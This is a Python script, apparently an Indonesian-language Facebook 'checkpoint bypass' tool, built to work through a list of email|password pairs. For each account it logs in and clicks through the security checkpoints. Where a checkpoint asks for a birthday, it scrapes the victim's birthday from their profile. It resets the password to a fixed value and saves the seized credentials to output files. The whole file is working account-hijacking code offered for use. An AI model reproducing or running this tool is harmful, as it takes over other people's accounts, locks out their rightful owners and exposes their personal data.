import requests,os
import bs4,re,json
import mechanize
from data import cache
from data.color import *
from data import language
cache.cleanCache()


class cek:
	def __init__(self,email,pw):
		self.line="-"*40
		config=open("config/config.json").read()
		self.config=json.loads(config)
		self.pw=pw
		self.email=email
		self.i="https://mbasic.facebook.com/{}"
		self.req=requests.Session()
		self.m=mechanize.Browser()
		self.m.set_handle_equiv(True)
		self.m.set_handle_redirect(True)
		self.m.set_handle_robots(False)
		self.login()
		
	def pising(self):
		self.m._factory.is_html=True
		self.m.select_form(nr=0)
		self.m.submit(name="submit[Continue]")
		if "Kami saat ini tidak dapat memverifikasi identitas Anda" in self.m.response().read().lower():
			print("[!] message: Kami saat ini tidak dapat memverifikasi identitas Anda")
		self.m._factory.is_html=True
		self.m.select_form(nr=0)
		self.m.submit(name="submit[Continue]")
		self.bypass_newpass()
		
	def login(self):
		self.m.open(self.i.format("login"))
		self.m._factory.is_html=True
		language.mec(self.m,
		"https://mbasic.facebook.com/language.php")
		self.m.select_form(nr=0)
		self.m.form["email"]="%s"%(self.email)
		self.m.form["pass"]="%s"%(self.pw)
		self.m.submit()
		s=self.m.geturl()

		
		if "checkpoint" in s:
			print("\n[%s*%s] Looking Checkpoint For: %s|%s"%(C,N,self.email,self.pw))
			self.detect()
		else:
			print('[%s!%s] No Checkpoint Detected for: %s|%s'%(R,N,self.email,self.pw))
			self.m.close()
			
	def detect(self):
		bs=bs4.BeautifulSoup(
			self.m.response().read(),
		features="html.parser")

		find=bs.find("div",{"id":"checkpoint_subtitle"})
		if find is None:
			if "phishing" in self.m.response().read():
				self.pising()
			else:
				print('%s[!]%s no checkpoint detected\n%s'%(R,N,self.line))
		else:
			print("%s[!]%s checking checkpoint type ..."%(G,N))
			self.cektipe()
			
	def cektipe(self):
		self.m._factory.is_html=True
		self.m.select_form(nr=0)
		self.m.submit(name="submit[Continue]")
		res=self.m.response().read()
		bs=bs4.BeautifulSoup(res,
			features="html.parser")
		if len(re.findall("Apakah Ini Anda\?",res)) !=0:
			print("[!] Booyah!! checkpoint just tap login ^^")
			print("[!] Bypassing next button ...")
			self.justTap()
		else:
			ty=[]
			founds=""
			for x in bs.find_all("option"):
				print("%s[!]%s %s"%(R,N,x.renderContents()))
				ty.append(x.renderContents())
			for x in ty:
				if "tanggal" in x.lower():
					founds=self.email
					break
			if founds !="":
				print "[!] testing for checkpoint type"
				self.getTanggal(self.email)
			else:
				print("%s[!]%s we can't unlock this checkpoint type:(\n%s"%(R,N,self.line))
	
	def getTanggal(self,email):
		s=self.req.post(self.i.format("login"),
		data=
			{
				"email":self.config["email"],
				"pass":self.config["pass"]
			}
		).url
		if "save-device" in s or "m_sess" in s:
			language.lang(self.req,
			"https://mbasic.facebook.com/language.php")
			print("%s[!]%s searching birthday date ..."%(G,N))
			self.dat(email)
		else:print("%s[!]%s failed when login into your account."%(R,N))

				
	def dat(self,email):
		r=self.req.get(
			self.i.format(email+"/about")).text
		y=re.findall("Lahir pada tanggal (.*?)<",r)
		
		if len(y) !=0:
			print "%s[+]%s Found her bithday date: %s "%(G,N,y[0])
			print "-"*50
		else:
			print "%s[!]%s private birthday date detected"%(R,N)
			print "-"*50

		
	def justTap(self):
		self.m._factory.is_html=True
		self.m.select_form(nr=0)
		self.m.submit(name="submit[Yes]")
		res=self.m.response().read()
		reg=re.findall("Anda harus mengubah kata sandi",res)
		if len(reg) !=0:
			print("[!] %s"%(reg[0]))
			self.m._factory.is_html=True
			self.m.select_form(nr=0)
			self.m.submit(name="submit[Continue]")
			self.bypass_newpass()
		else:
			print("%s[!]%s congrats! bypassed!"%(G,N))
			print("%s[+]%s result: out/multiresult.txt\n%s"%(G,N,self.line))
			open("out/multiresult.txt","a").write("%s|%s\n"%(self.email,self.pw))
			
	def bypass_newpass(self):
		print("[!] change password ...")
		if "gunakan kode konfirmasi" in self.m.response().read().lower():
			print("[!] ops this action nedned to verification code.\n")
		if "Kami akan memperlihatkan beberapa foto" in self.m.response().read():
			print("[!] ops! captcha photos detected.\n")
		self.m._factory.is_html=True
		self.m.select_form(nr=0)
		self.m.form["password_new"]="querty@"
		self.m.form["password_confirm"]="querty@"
		self.m.submit()
		print("%s[+]%s pasword changed ^^"%(G,N))
		print("%s[+]%s newpassword: %s|querty@"%(G,N,self.email))
		print("%s[!]%s result saved: out/newpassword.txt\n%s"%(G,N,self.line))
		open("out/newpassword.txt","a").write("%s|querty@\n"%(self.email))


class bypass:
	def __init__(self):
		if os.path.exists("out"):
			if os.path.exists("out/multiresult.txt"):
				if os.path.getsize("out/multiresult.txt") !=0:
					cek=raw_input('%s[!]%s file exists: out/%smultiresult.txt%s\n%s[?]%s replace? y/n): '%(R,N,B,N,R,N)).lower()
					if cek == "y":
						open("out/multiresult.txt","w").close()
			else:open("out/multiresult.txt","w").close()
		else:
			os.mkdir("out")
			open("out/multiresult.txt","w").close()
		if os.path.exists("out"):
			if os.path.exists("out/newpassword.txt"):
				if os.path.getsize("out/newpassword.txt") !=0:
					cek=raw_input('%s[!]%s file exists: out/%snewpassword.txt%s\n%s[?]%s replace? y/n): '%(R,N,G,N,R,N)).lower()
					if cek == "y":
						open("out/newpassword.txt","w").close()
			else:open("out/newpassword.txt","w").close()
		else:
			os.mkdir("out")
			open("out/newpassword.txt","w").close()
		self.files()
		
	def files(self):
		try:
			r=open(raw_input("[%s*%s] sparator: |\n%s[+]%s account list: "%(C,N,G,N))).read().splitlines()
			self.run(r)
		except Exception as f:
			print("%s[!]%s %s"%(R,N,f))
			return self.files()
	
	def run(self,r):
		for i in r:
			p=i.split("|")
			try:
				cek(p[0],p[-1])
			except Exception as f:
				print f
				continue
			

